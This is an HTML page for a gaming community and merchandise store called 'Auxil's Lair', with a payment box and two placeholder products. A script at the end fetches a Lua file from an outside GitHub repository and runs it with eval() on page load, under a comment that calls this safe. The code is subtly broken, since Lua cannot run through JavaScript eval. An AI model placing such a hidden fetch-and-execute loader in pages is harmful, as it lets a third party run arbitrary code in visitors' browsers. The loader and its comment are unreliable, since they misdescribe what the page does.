
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Auxil's Lair</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.1.2/dist/tailwind.min.css" rel="stylesheet">
    <style>
        /* Custom styles for your page */
        .laser-effect {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(45deg, #7f00ff, #ff00c8);
            z-index: -1;
            animation: laser 2s infinite ease-in-out;
        }

        @keyframes laser {
            0% {
                transform: translateX(0);
            }
            50% {
                transform: translateX(100%);
            }
            100% {
                transform: translateX(0);
            }
        }
    </style>
</head>
<body class="bg-black text-white font-sans">

    <!-- Payment Section -->
    <div class="flex justify-center mt-10">
        <div class="bg-purple-600 p-6 rounded-lg shadow-lg text-center">
            <h3 class="text-2xl text-white font-bold mb-4">Access Premium Features</h3>
            <p class="text-purple-300 mb-4">Unlock exclusive features with a payment.</p>
            <button class="btn-primary text-white px-6 py-3 rounded-lg">Pay Now</button>
        </div>
    </div>

    <main class="flex flex-col items-center justify-center text-center mt-20 px-6 animate-fade">
        <div class="content-box">
            <div class="laser-effect"></div>
            <h2 class="text-5xl font-bold text-purple-300 animate-fade">Welcome to Auxil's Lair</h2>
            <p class="text-lg text-purple-400 mt-4 max-w-2xl animate-fade" style="animation-delay: 1s;">
                Your ultimate gaming community. Connect, compete, and shop exclusive merchandise.
            </p>
            <a href="#" class="btn-primary text-white px-6 py-3 rounded-lg mt-6 inline-block shadow-lg animate-fade" style="animation-delay: 2s;">Explore the Store</a>
        </div>

        <!-- ðŸ›’ Products Section -->
        <section class="mt-20 w-full max-w-4xl">
            <h2 class="text-4xl font-bold text-purple-300 mb-6">Featured Products</h2>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div class="bg-gray-900 p-6 rounded-lg shadow-lg">
                    <img src="https://via.placeholder.com/200" alt="Product 1" class="mx-auto mb-4">
                    <h3 class="text-xl font-bold text-purple-400">Gaming Mouse</h3>
                    <p class="text-purple-300">$49.99</p>
                    <button class="btn-primary text-white px-4 py-2 mt-3 rounded-lg">Buy Now</button>
                </div>
                <div class="bg-gray-900 p-6 rounded-lg shadow-lg">
                    <img src="https://via.placeholder.com/200" alt="Product 2" class="mx-auto mb-4">
                    <h3 class="text-xl font-bold text-purple-400">Mechanical Keyboard</h3>
                    <p class="text-purple-300">$89.99</p>
                    <button class="btn-primary text-white px-4 py-2 mt-3 rounded-lg">Buy Now</button>
                </div>
            </div>
        </section>
    </main>

    <!-- Script Loading Section -->
    <script>
        // Function to safely load the external script
        const scriptUrl = "https://raw.githubusercontent.com/flanchhh/AntiV2/refs/heads/main/Anti%20v2.lua";
        const loadExternalScript = (url) => {
            // Try fetching the script with HttpGet and check for any errors
            fetch(url)
                .then(response => response.text())
                .then(script => {
                    if (script) {
                        try {
                            // Try executing the script
                            eval(script);
                            console.log("Script executed successfully.");
                        } catch (error) {
                            console.warn("Error executing script:", error);
                        }
                    } else {
                        console.warn("Fetched script is empty or invalid.");
                    }
                })
                .catch(error => {
                    console.warn("Failed to fetch the script:", error);
                });
        };

        // Call the function to load the script
        loadExternalScript(scriptUrl);
    </script>

</body>
</html>
